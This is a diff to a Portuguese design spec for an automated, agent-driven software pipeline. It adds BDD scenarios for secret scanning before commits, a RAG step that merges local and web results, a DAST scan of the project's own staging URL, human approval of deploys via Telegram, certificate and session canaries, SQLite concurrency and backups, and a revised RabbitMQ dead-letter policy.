+#### BDD-F1-18: Interceptação Preventiva de Segredos no Fluxo de Commit Git (TC-191)
+```gherkin
+Funcionalidade: Interceptação Preventiva de Segredos com Gitleaks no Git VCS Gateway (:3011)
+  Como arquiteto de segurança da informação
+  Quero que o gateway de versionamento escaneie todo git diff antes de registrar commits
+  Para assegurar que nenhuma chave de API, token ou senha seja gravada no histórico
+
+  Cenário: Bloqueio atômico de commit contendo token de API exposto
+    Dado que o Dev Agent modificou arquivos adicionando uma chave privada de produção
+    Quando o orquestrador invoca a ferramenta MCP "git_commit" com a mensagem "feat: configurar auth"
+    Então o "git-vcs-gateway" deve acionar internamente o scanner Gitleaks no diff staged
+    E o Gitleaks deve detectar a presença de padrão de segredo privado
+    E a criação do commit deve ser abortada imediatamente no Git local
+    E os arquivos devem retornar ao estado uncommitted
+    E a ferramenta deve retornar erro detalhando o arquivo e a linha onde o segredo foi localizado
+```
+
+#### BDD-F1-19: Ciclo de Avaliação Ambígua no Corrective RAG (CRAG) com Fusão Local + Web (TC-199)
+```gherkin
+Funcionalidade: Avaliação Ambígua no Corrective RAG com Fusão Local e Web (:3013)
+  Como agente cognitivo da fábrica de software
+  Quero enriquecer respostas locais de média confiança com dados complementares da web
+  Para obter cobertura técnica precisa quando o conhecimento interno for incompleto
+
+  Cenário: Recuperação com score ambíguo e complementação via SearXNG
+    Dado que um agente consulta a ferramenta "recall" sobre uma biblioteca recém-lançada
+    Quando o Qdrant retorna fragmentos locais e o juiz "BGE-Reranker-v2-M3" avalia o score em 0.65 (faixa 0.50 a 0.79)
+    Então o estado é classificado como "AMBIGUOUS"
+    E o "knowledge-memory-gateway" deve acionar automaticamente a busca no SearXNG (:3009)
+    E o BGE-Reranker deve filtrar os parágrafos mais relevantes da web
+    E o microsserviço deve fundir o conhecimento local com os dados da web
+    E a resposta consolidada deve ser entregue ao agente com metadados indicando fontes locais e web
+```
+
+#### BDD-F1-20: Pentest Dinâmico Automatizado com Nuclei DAST no Security Gateway (:3015) (TC-208)
+```gherkin
+Funcionalidade: Pentest Dinâmico com Nuclei DAST no Security Gateway (:3015)
+  Como analista de segurança de aplicações (AppSec)
+  Quero executar varredura dinâmica contra a URL de homologação gerada na Vercel
+  Para identificar falhas de cabeçalhos, SSL e CORS antes do deploy em produção
+
+  Cenário: Varredura de cabeçalhos e configurações com Nuclei em URL efêmera
+    Dado que o "deploy-cloud-gateway" publicou uma URL de demonstração ou staging
+    Quando o Security Agent invoca a ferramenta MCP "run_dast_scan" com o perfil "headers-ssl"
+    Então o motor Nuclei deve disparar templates de validação contra a URL remota
+    E deve inspecionar cabeçalhos de segurança essenciais como Content-Security-Policy e HSTS
+    E deve retornar um relatório estruturado com contagem de vulnerabilidades e remediações sugeridas
+    E se houver falhas críticas, o Gate de Segurança deve registrar status reprovado
+```
+
+#### BDD-F1-21: Ciclo Interativo de Aprovação Humana de Decisões pelo Telegram (TC-176 & TC-217)
+```gherkin
+Funcionalidade: Rastreabilidade e Decisão Interativa de Aprovação via Telegram Gateway (:3008)
+  Como proprietário da software house (João)
+  Quero aprovar ou rejeitar decisões sensíveis diretamente por botões interativos no Telegram
+  Para manter governança e supervisão humana sobre deploys em produção e ações financeiras
+
+  Cenário: Aprovação interativa de deploy de produção com atualização de mensagem
+    Dado que a esteira finalizou a fábrica de um software e aguarda aprovação de deploy
+    Quando o "telegram-gateway" posta solicitação na fila "telegram.approvals" e envia mensagem com botões inline
+    E João clica no botão "Aprovar" no aplicativo do Telegram
+    Então o bot deve interceptar o callback query com ID soberano
+    E deve atualizar o registro na tabela "telegram_approvals" para "APPROVED" com timestamp
+    E deve editar o texto da mensagem no chat para "✅ Aprovado por João em [horário]"
+    E deve publicar o evento de confirmação no RabbitMQ liberando o "deploy-cloud-gateway"
+
+  Cenário: Expiração automática de solicitação de aprovação após 24 horas sem resposta
+    Dado que uma solicitação de aprovação crítica foi enviada para João há mais de 24 horas
+    Quando o worker de governança executa a checagem periódica de solicitações pendentes
+    Então o status da solicitação na tabela "telegram_approvals" deve transicionar para "EXPIRED"
+    E a ação crítica dependente deve ser bloqueada preventivamente
+    E João deve receber notificação no Telegram informando o cancelamento da operação por timeout de 24 horas
+```
+
+#### BDD-F1-22: Monitoramento Proativo Canário de Sessões Sociais e Certificados mTLS (TC-183 & TC-220)
+```gherkin
+Funcionalidade: Monitoramento Sintético Canário de Certificados e Sessões Sociais
+  Como mantenedor de operações contínuas
+  Quero que a esteira valide preventivamente cookies de prospecção e datas de expiração de certificados
+  Para prevenir falhas operacionais antes que qualquer cliente seja impactado
+
+  Cenário: Alerta preventivo de renovação de certificado mTLS do Banco Inter
+    Dado que o cron diário das 09:00 é disparado no microsserviço "payment-gateway" (:3006)
+    Quando o certificado "inter.crt" possui validade remanescente inferior a 30 dias
+    Então o serviço deve calcular exatamente os dias restantes
+    E deve emitir uma mensagem prioritária na fila "telegram.alerts" detalhando o prazo e o link de renovação
+    E o sistema deve continuar processando cobranças normalmente até a data limite
+
+  Cenário: Teste canário periódico de sessão social a cada 6 horas
+    Dado que o cron de 6 horas é executado no "osint-scraper-gateway" (:3009)
+    Quando a requisição sintética de verificação do cookie do Instagram redireciona para a tela de login
+    Então o gateway deve marcar o status do cookie como "expired"
+    E deve emitir alerta no Telegram orientando o operador a atualizar o token
+    E deve pausar tarefas de raspagem daquela plataforma sem provocar erros em cascata
+```
+
+#### BDD-F1-23: Concorrência de Escrita no SQLite WAL e Backup Atômico em Quente (TC-222 & TC-223)
+```gherkin
+Funcionalidade: Concorrência no SQLite WAL e Snapshot Atômico em Quente
+  Como arquiteto de banco de dados
+  Quero garantir integridade transacional sob concorrência e backups em quente sem parada
+  Para manter a persistência soberana do arquivo pipeline.db protegida contra corrupção
+
+  Cenário: Escritas simultâneas com busy_timeout de 5.000 milissegundos
+    Dado que 5 microsserviços tentam gravar simultaneamente no banco central "pipeline.db"
+    Quando as transações concorrentes entram em disputa por bloqueio de escrita no modo WAL
+    Então o driver SQLite deve aplicar o mecanismo de "busy_timeout" aguardando até 5.000ms
+    E todas as transações devem ser serializadas e concluídas com sucesso sem erros de "database is locked"
+    E a integridade de todas as tabelas afetadas deve ser mantida
+
+  Cenário: Execução de backup diário às 03:00 com VACUUM INTO sem interrupção de serviço
+    Dado que a esteira continua recebendo e processando dados às 03:00
+    Quando o script de manutenção dispara o comando "VACUUM INTO" gerando arquivo de backup compactado
+    Então o SQLite deve gerar o clone idêntico em "/storage/backups/sqlite/"
+    E nenhuma requisição de leitura ou escrita dos microsserviços deve ser bloqueada durante a cópia
+    E o arquivo de backup resultante deve passar no teste de integridade "PRAGMA integrity_check"
+```
+
 ---
 
 ## 16. Segurança de Borda & Remediações Arquiteturais Herdadas da Auditoria (Fase 1)
@@ -1370,7 +1655,11 @@ Funcionalidade: Auditoria de Segurança, Varredura de Segredos e Quality Gate co
     * `telegram.alerts` (binding: `telegram.alert.*` — notificações operacionais e de segurança)
     * `telegram.approvals` (binding: `telegram.approval.*` — solicitações de decisão pendente)
     * `payment.webhooks` (binding: `payment.event.*` — confirmações de liquidação PIX)
-  * **Dead-Letter Exchange (DLX):** `agency.dlx` com fila `agency.poison_messages` para capturar e isolar mensagens malformadas ou com falhas persistentes após 3 tentativas de entrega.
+  * **Dead-Letter Exchange (DLX) & Governança de Poison Messages:**
+    * **Exchange e Fila:** `agency.dlx` com fila durável `agency.poison_messages` para capturar e isolar mensagens malformadas ou com falhas persistentes após 3 tentativas de entrega.
+    * **Política de Retenção & Auto-Expurgo (TTL 7 Dias):** A fila opera com `x-message-ttl: 604800000` (7 dias). Mensagens não tratadas após 7 dias são automaticamente expurgadas pelo RabbitMQ.
+    * **Alerta Imediato no Telegram:** O roteamento de qualquer mensagem para a DLX dispara imediatamente um evento prioritário na fila `telegram.alerts` avisando João com o `message_id`, microsserviço emissor, payload e stacktrace da última falha.
+    * **Replay Manual:** Disponibilização de endpoint administrativo interno (`POST /api/v1/dlx/replay`) para inspecionar e reprocessar manualmente as mensagens retidas antes do término da janela de 7 dias.
 * **Governança de Tipagem e Teto de Payload:**
   * Todas as mensagens inter-serviços devem obrigatoriamente encapsular um envelope Pydantic/TypeScript padronizado:
     * `message_id`: UUID v4
